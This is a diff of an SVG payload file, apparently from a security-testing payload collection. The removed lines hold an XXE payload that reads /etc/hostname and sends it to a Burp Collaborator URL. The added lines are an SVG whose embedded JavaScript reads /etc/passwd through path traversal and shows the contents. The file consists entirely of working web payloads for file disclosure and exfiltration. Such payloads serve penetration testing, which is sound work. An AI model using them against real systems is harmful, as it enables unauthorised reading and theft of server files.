@@ -1,5 +1,24 @@
-<?xml version="1.0" standalone="yes"?>
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://h3ljhi92amiee8apaio290anaeg44t.burpcollaborator.net/?x=%file;'>">
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
- <text font-size="500" x="0" y="500">%eval;%exfiltrate;</text></svg>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>
+function readTextFile(file)
+{
+    var rawFile = new XMLHttpRequest();
+    rawFile.open("GET", file, false);
+    rawFile.onreadystatechange = function ()
+    {
+        if(rawFile.readyState === 4)
+        {
+            if(rawFile.status === 200 || rawFile.status == 0)
+            {
+                var allText = rawFile.responseText;
+                alert(allText);
+            }
+        }
+    }
+    rawFile.send(null);
+}
+
+readTextFile("file:///../../../../../../../../../etc/passwd");
+</script>
+</svg>
